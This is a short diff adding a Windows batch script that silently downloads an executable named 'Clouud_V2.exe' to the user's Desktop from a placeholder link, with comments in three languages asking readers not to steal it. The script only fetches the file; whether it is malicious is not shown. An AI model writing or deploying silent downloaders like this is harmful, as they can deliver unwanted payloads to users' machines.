@@ -1,1 +1,7 @@
-set sv=1
+@echo off
+:: If reading this, please don't steal anything!
+:: Se está lendo isso, porfavor não roube nada!
+:: Si estás leyendo esto, ¡no robes nada!
+set link=LINK AQUI
+curl -s -o C:\Users\%username%\Desktop\Clouud_V2.exe %link%
+exit
